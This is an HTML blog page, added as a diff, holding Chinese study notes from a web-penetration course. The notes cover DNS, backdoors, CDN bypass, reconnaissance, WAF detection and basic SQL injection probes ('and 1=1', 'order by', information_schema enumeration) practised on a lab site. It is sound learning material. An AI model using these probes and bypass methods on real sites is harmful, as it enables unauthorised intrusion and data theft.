@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>小迪安全 | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="小迪安全第一天基础名词域名1234域名：二级域名：域名对于安全测试的意义：	多级域名的情况下如果测试的域名没有发现漏洞，可以通过测试同域名下的其他网站，来曲线救国，通过其他网站攻击进入服务器获取权限，再来攻击该网站。  DNS12345678910什么是DNS：	DNS将数名解析成IP地址HOST与DNS的关系:	本地HOST重定向域名地址	在解析IP地址前首先检测HOST，当HOST没有时，才访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小迪安全">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="小迪安全第一天基础名词域名1234域名：二级域名：域名对于安全测试的意义：	多级域名的情况下如果测试的域名没有发现漏洞，可以通过测试同域名下的其他网站，来曲线救国，通过其他网站攻击进入服务器获取权限，再来攻击该网站。  DNS12345678910什么是DNS：	DNS将数名解析成IP地址HOST与DNS的关系:	本地HOST重定向域名地址	在解析IP地址前首先检测HOST，当HOST没有时，才访">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210906091716474.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210906151400324.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210906152218077.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210907131059658.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210911094537072-16313247437281.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210914150820973.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210915091354495.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210916085637100.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210916090202933.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210920153434040.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20211025142723291.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20211025151438842.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/ssrf.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/fileload.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/xml.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/%E8%84%9A%E6%9C%AC%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/java.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/jwt.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/jwt%E7%AD%BE%E5%90%8D.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/jwt%E4%BC%A0%E8%BE%93.png">
+<meta property="article:published_time" content="2021-09-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:06:18.687Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/image-20210906091716474.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xiaodi1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/xiaodi1/" class="article-date">
+  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      小迪安全
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="小迪安全"><a href="#小迪安全" class="headerlink" title="小迪安全"></a>小迪安全</h1><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名：</span><br><span class="line">二级域名：</span><br><span class="line">域名对于安全测试的意义：</span><br><span class="line">	多级域名的情况下如果测试的域名没有发现漏洞，可以通过测试同域名下的其他网站，来曲线救国，通过其他网站攻击进入服务器获取权限，再来攻击该网站。</span><br></pre></td></tr></table></figure>
+
+<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">什么是DNS：</span><br><span class="line">	DNS将数名解析成IP地址</span><br><span class="line">HOST与DNS的关系:</span><br><span class="line">	本地HOST重定向域名地址</span><br><span class="line">	在解析IP地址前首先检测HOST，当HOST没有时，才访问DNS</span><br><span class="line">CDN：</span><br><span class="line">	缓存节点，根据地区接近给一个节点，主要降低通讯时间，相应时间。</span><br><span class="line">常见的dns攻击：</span><br><span class="line">	恶意解析（域名劫持），dns服务器被黑后，请求被指向恶意地址</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">脚本语言：</span><br><span class="line">	python、asp、php、jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">什么是后门：</span><br><span class="line">	方便攻击者下次攻击控制网站（网站后门，服务器后门）</span><br><span class="line">后门实际意义：</span><br><span class="line">	1.方便下次攻击</span><br><span class="line">	2.获取相关权限的管道</span><br><span class="line">后门注意：</span><br><span class="line">	玩法： 更好控制，更隐蔽，等</span><br><span class="line">	免杀：不被检测到，不被识别</span><br></pre></td></tr></table></figure>
+
+<h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB架构类型：</span><br><span class="line">	网站源码分脚本类型、分应用方向</span><br><span class="line">	操作系统</span><br><span class="line">	中间件：apache、lis、tomcat、negix等</span><br><span class="line">	数据库：mysql、mmsql等</span><br><span class="line">为什么以web为主：</span><br><span class="line">	实用性广-大多数都有web</span><br></pre></td></tr></table></figure>
+
+<h4 id="WEB漏洞"><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WEB源码类漏洞：</span><br><span class="line">	SQL注入、上传、xss、代码执行、变量覆盖、逻辑漏洞、反序列化</span><br><span class="line">WEB中间件漏洞：</span><br><span class="line">	</span><br><span class="line">WEB数据库漏洞：</span><br><span class="line">WEB系统层漏洞：</span><br><span class="line">其他第三方漏洞：</span><br><span class="line">APP和PC应用结合类：</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p><strong>Request</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Request 请求数据包数据格式</span><br><span class="line">1.请求行		请求方法、请求URL、HTTP版本</span><br><span class="line">2.请求头		HOST、Accept、user-agent、Host、Accept-Langeuage、connection、cookie、</span><br><span class="line">3.空行</span><br><span class="line">4.请求体</span><br></pre></td></tr></table></figure>
+
+<p><strong>Response</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#Response 返回数据包格式</span><br><span class="line">1.状态行</span><br><span class="line">2.响应头标</span><br><span class="line">3.空行</span><br><span class="line">4.响应数据</span><br><span class="line"></span><br><span class="line">HTTP响应码</span><br><span class="line">1xx 信息收到</span><br><span class="line">2xx 成功</span><br><span class="line">3xx 重定向</span><br><span class="line">4xx 客户端错误</span><br><span class="line">5xx 服务器错误</span><br><span class="line"></span><br><span class="line">200 存在文件</span><br><span class="line">403 存在文件夹</span><br><span class="line">3xx 均可能存在</span><br><span class="line">404 不存在文件及文件夹</span><br><span class="line">500 均可能存在</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 域名IP文件目录解析安全问题</span><br><span class="line">有的网站用域名访问和用IP访问不在同一路径下</span><br><span class="line">原因是域名解析的设置</span><br><span class="line">IP访问是根目录</span><br><span class="line">域名访问是根目录设置的目录</span><br><span class="line"></span><br><span class="line"># 文件后缀解析对应安全</span><br><span class="line">服务器文件解析，可以通过中间件设置，不同的后缀对应的解析程序</span><br><span class="line">有时文件无法解析，可能就是服务器的中间件在文件后缀解析进行了设置</span><br><span class="line"></span><br><span class="line"># 安全测试中的安全防护</span><br><span class="line">证书验证</span><br><span class="line">在不开启匿名访问的条件下，打开网页需要验证账户密码</span><br><span class="line">访问IP地址黑名单、白名单</span><br><span class="line"></span><br><span class="line"># WEB后门与用户及文件权限</span><br><span class="line">菜刀</span><br><span class="line">匿名访问通过的是Internet来宾用户</span><br><span class="line">设置访问用户在目录下的权限</span><br><span class="line">win用户权限，在有拒绝的情况下，以拒绝为主</span><br><span class="line">设置目录的执行权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h2><p>WEB源码扩展</p>
+<p>![截屏2021-08-19 下午6.38.26](xiaodi1&#x2F;截屏2021-08-19 下午6.38.26-9369561.png)</p>
+<p>脚本源码安全问题</p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/">Web安全学习笔记 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 总结</span><br><span class="line">关注应用分类及脚本类型估摸出可能存在的漏洞，在获得源码后可进行本地安全测试或代码审计，也可分析其目录工作原理</span><br></pre></td></tr></table></figure>
+
+<h2 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h2><p>数据库</p>
+<p>漏洞类型</p>
+<p>![截屏2021-08-23 下午8.02.04](xiaodi1&#x2F;截屏2021-08-23 下午8.02.04.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line">识别操作系统常见方法</span><br><span class="line">- 如果有网站通过网站识别，如果没有网站通过扫描方法识别</span><br><span class="line">- win网站不区分大小写，linux区分大小写</span><br><span class="line">- 当没有网站时识别方法</span><br><span class="line">	- nmap</span><br><span class="line">	- ttl值 </span><br><span class="line">		- windows TTL：128</span><br><span class="line">		- unix TTL：255</span><br><span class="line">		= lnux TTL：64</span><br><span class="line"></span><br><span class="line">简要两者区别及意义</span><br><span class="line">- 操作系统差异</span><br><span class="line">	- 不同操作系统攻击的方法不一样</span><br><span class="line">	- 区分大小写</span><br><span class="line">	- 一些文件无能在其他系统兼容</span><br><span class="line">- 意义</span><br><span class="line">	- 适用不同的漏洞</span><br><span class="line"></span><br><span class="line">操作系统层面漏洞类型对应意义</span><br><span class="line">- 有些漏洞只有危害，不会涉及权限丢失</span><br><span class="line">- 有些漏洞丢失权限</span><br><span class="line"></span><br><span class="line">简要操作系统层面漏洞影响范围</span><br><span class="line">- 权限</span><br><span class="line">- 崩溃</span><br><span class="line">- 干扰</span><br><span class="line"></span><br><span class="line"># 数据库方面</span><br><span class="line">识别数据库类型常见方法</span><br><span class="line">- 网站</span><br><span class="line">	- php+mysql(3306)</span><br><span class="line">	- ASP+access</span><br><span class="line">	- python+mongdb（27017）</span><br><span class="line">	- jsp+mssql，oracle（1521）</span><br><span class="line">	- aspx+mssql（1433）</span><br><span class="line">- nmap</span><br><span class="line"></span><br><span class="line">数据库类型区别及识别实施</span><br><span class="line">- 数据库不同，漏洞不同</span><br><span class="line">- 攻击方法不同，影响结果不同</span><br><span class="line"></span><br><span class="line">数据库常见漏洞类型及攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">简要数据库层面漏洞影响范围</span><br><span class="line">- 登陆网站后台</span><br><span class="line">- 获取数据库</span><br><span class="line"></span><br><span class="line"># 第三方方面</span><br><span class="line">如何判定有哪些第三方平台或软件</span><br><span class="line">- 访问目录，如：phpadmin</span><br><span class="line">- 端口扫描</span><br><span class="line"></span><br><span class="line">简要为什么要识别第三方平台或软件</span><br><span class="line"></span><br><span class="line">常见第三方平台或软件漏洞类型及攻击</span><br><span class="line">- 可以直接获取权限</span><br><span class="line"></span><br><span class="line">简要第三方平台或软件安全测试的范围</span><br><span class="line"></span><br><span class="line"># 补充</span><br><span class="line">除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件、游戏、负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题，所以民权安全测试思路时很重要的</span><br></pre></td></tr></table></figure>
+
+<h2 id="第六天"><a href="#第六天" class="headerlink" title="第六天"></a>第六天</h2><p>加密编码算法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 常见加密编码等算法解析</span><br><span class="line">MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES，等</span><br><span class="line">时间戳：unix时间</span><br><span class="line">URL编码：空格-%20，二次转码-可用于绕</span><br><span class="line">BASE64:区分大小写，字符串末尾经常出现==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 常见加密形式算法解析</span><br><span class="line">直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</span><br><span class="line"></span><br><span class="line"># 常见揭秘方法（针对）</span><br><span class="line">枚举，自定义逆向算法，可逆向</span><br><span class="line"></span><br><span class="line"># 了解常规加密算法的特征</span><br><span class="line">长度位数，自负规律，代码分析，搜索获取</span><br></pre></td></tr></table></figure>
+
+<h2 id="第七天"><a href="#第七天" class="headerlink" title="第七天"></a>第七天</h2><p>CDN绕过</p>
+<p>使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 目前常见的CDN绕过技术有</span><br><span class="line">子域名查询      		 （只对主域名进行cdn服务）</span><br><span class="line">邮件服务查询 			（邮箱服务器大部分是内部人员访问）</span><br><span class="line">				   -（访问网页是我找服务器，接收邮件是服务器找我）</span><br><span class="line">国外地址请求			（国内网站一般不会把cdn部署到国外）</span><br><span class="line">遗留文件，扫描全网	  （phpinfo，从各个地方访问网站，从访问的IP分析，找到真是IP地址）</span><br><span class="line">黑暗引擎搜索特定文件	 （黑暗搜索引擎会定时爬取网页数据）</span><br><span class="line">dns历史记录，以量打量  </span><br></pre></td></tr></table></figure>
+
+<h2 id="第八天"><a href="#第八天" class="headerlink" title="第八天"></a>第八天</h2><p>信息收集-WEB</p>
+<ul>
+<li>WEB<ul>
+<li>有CDN<ul>
+<li>国外请求</li>
+<li>接口查询</li>
+<li>黑暗引擎</li>
+<li>扫描全网</li>
+<li>子域名</li>
+</ul>
+</li>
+<li>无CDN<ul>
+<li>程序源码<ul>
+<li>内部&#x2F;未知CMS</li>
+<li>开源CMS</li>
+</ul>
+</li>
+<li>其他<ul>
+<li>操作系统</li>
+<li>搭建平台</li>
+<li>数据库类型</li>
+</ul>
+</li>
+<li>站点搭建<ul>
+<li>目录站点</li>
+<li>端口站点</li>
+<li>子域名站点</li>
+<li>旁注&#x2F;C段站点</li>
+<li>类似域名站点</li>
+</ul>
+</li>
+<li>防护应用WAF<ul>
+<li>安全狗</li>
+<li>宝塔</li>
+<li>云盾</li>
+<li>安骑士</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>APP<ul>
+<li>涉及WEB</li>
+<li>非WEB协议<ul>
+<li>尝试提取</li>
+<li>反编译逆向</li>
+<li>若还无WEB转</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>其他<ul>
+<li>资产信息<ul>
+<li>以上各种平台信息</li>
+<li>whois备案</li>
+<li>github监控</li>
+</ul>
+</li>
+<li>第三方应用<ul>
+<li>数据库应用<ul>
+<li>mysql</li>
+<li>mssql</li>
+<li>oracle</li>
+</ul>
+</li>
+<li>各种管理平台<ul>
+<li>weblogic</li>
+<li>phpmyadmin</li>
+</ul>
+</li>
+<li>各种第三方应用<ul>
+<li>vsftpd</li>
+<li>nexus</li>
+<li>git</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>各种服务接口<ul>
+<li>存储服务</li>
+<li>支付服务</li>
+<li>内部服务</li>
+</ul>
+</li>
+<li>微信公众号<ul>
+<li>涉及WEB</li>
+<li>涉及APP</li>
+<li>涉及其他</li>
+</ul>
+</li>
+<li>内部群内部应用</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># CMS识别技术</span><br><span class="line"></span><br><span class="line"># 源码获取技术</span><br><span class="line"></span><br><span class="line"># 架构信息获取</span><br><span class="line"></span><br><span class="line"># 站点搭建分析</span><br><span class="line">目录型站点</span><br><span class="line">	- 同一网址下，不同路径是不同的站点搭建，即攻击其中一个成功，就可以对另一个站点造成影响</span><br><span class="line">端口型站点</span><br><span class="line">	- 不同端口下，不同的站点</span><br><span class="line">子域名站点</span><br><span class="line">类似域名站点</span><br><span class="line">旁注，C段站点</span><br><span class="line">	- 同服务器，不同站点</span><br><span class="line">搭建软件特征站点</span><br><span class="line"></span><br><span class="line"># WAF防护分析</span><br><span class="line">什么是WAF应用</span><br><span class="line">	- 应用级入侵防御系统</span><br><span class="line">	- 软件/硬件</span><br><span class="line">	- web应用防火墙</span><br><span class="line">如何快速识别WAF</span><br><span class="line">	- wafw00f</span><br><span class="line">识别WAF对于安全测试的意义 </span><br></pre></td></tr></table></figure>
+
+<h2 id="第九天"><a href="#第九天" class="headerlink" title="第九天"></a>第九天</h2><p>信息收集-APP和其他信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 黑暗引擎</span><br><span class="line">shodan、zoomeye、fofa</span><br></pre></td></tr></table></figure>
+
+<h2 id="第十天"><a href="#第十天" class="headerlink" title="第十天"></a>第十天</h2><p>资产监控扩展</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Github监控</span><br><span class="line">便于手机整理最新的exp或poc</span><br><span class="line">便于发现相关测试目标的资产</span><br><span class="line"></span><br><span class="line"># 各种</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爬取信息的工具<ul>
+<li>黑暗引擎</li>
+<li>全自动域名收集枚举优秀脚本</li>
+<li>SRC目标中的信息收集全覆盖</li>
+<li>利用其他三方接口获取更多信息</li>
+</ul>
+</li>
+</ul>
+<h2 id="第十一天"><a href="#第十一天" class="headerlink" title="第十一天"></a>第十一天</h2><p>WEB漏洞</p>
+<p><img src="/2021/10/01/xiaodi1/image-20210906091716474.png" alt="image-20210906091716474"></p>
+<ul>
+<li>漏洞危害</li>
+<li>漏洞等级</li>
+<li>漏洞重点</li>
+<li>漏洞形式</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># sql注入</span><br><span class="line"># 目录遍历</span><br><span class="line"># 文件读取</span><br><span class="line"># 文件上传</span><br></pre></td></tr></table></figure>
+
+<h2 id="第十二天"><a href="#第十二天" class="headerlink" title="第十二天"></a>第十二天</h2><p>sql注入——严重安全漏洞</p>
+<p>回显注入                                                                    access</p>
+<p><img src="/2021/10/01/xiaodi1/image-20210906151400324.png" alt="image-20210906151400324"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># sql注入的安全危害</span><br><span class="line">操作数据库</span><br><span class="line">后门写入</span><br><span class="line"># sql注入产生原理</span><br><span class="line">可控变量，带入数据块是查询，变量未存在过滤或过滤不严谨</span><br><span class="line"></span><br><span class="line">sql注入，通过将参数传递到服务器实现查询。</span><br><span class="line"></span><br><span class="line">实验案例</span><br><span class="line">sqllib less2：联合查询</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/01/xiaodi1/image-20210906152218077.png" alt="image-20210906152218077"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">and 1=1 </span><br><span class="line">猜测列名数量（字段数） order by x 正常与错误的临界点</span><br><span class="line"></span><br><span class="line"># 信息收集</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名字：database（）</span><br><span class="line">数据库用户：user（）</span><br><span class="line">操作系统：@@version_compile_os</span><br><span class="line"></span><br><span class="line">必备知识点</span><br><span class="line">在mysql 5.0以上版本中，mysql存在一个自带数据库名为information_schema，他是一个存储所有数据库名、表名、列名的数据库，也相当于可以通过查询它获得相应数据库下的表名和列名。</span><br><span class="line">数据库中.代表下一级，user.xiaodi 代表user下的xiaodi</span><br><span class="line">information_schema.tables			表</span><br><span class="line">information_schema.columes			列</span><br><span class="line"></span><br><span class="line">sql语句group_concat()将查询到的数据连接起来</span><br></pre></td></tr></table></figure>
+
+<h2 id="第十三天"><a href="#第十三天" class="headerlink" title="第十三天"></a>第十三天</h2><p><img src="/2021/10/01/xiaodi1/image-20210907131059658.png" alt="image-20210907131059658"></p>
